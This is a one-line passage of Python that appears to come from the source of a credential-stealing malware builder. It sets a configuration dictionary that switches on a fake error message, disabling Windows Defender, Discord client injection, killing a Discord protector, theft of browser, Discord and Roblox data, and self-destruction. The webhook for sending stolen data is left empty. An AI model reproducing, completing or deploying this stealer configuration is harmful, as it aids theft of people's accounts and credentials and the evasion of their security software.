...
__CONFIG__ = {'webhook': None, 'ping': True, 'pingtype': 'Everyone', 'fakeerror': True, 'startup': False, 'defender': True, 'systeminfo': False, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': False, 'wifi': False, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': True, 'clipboard': False}
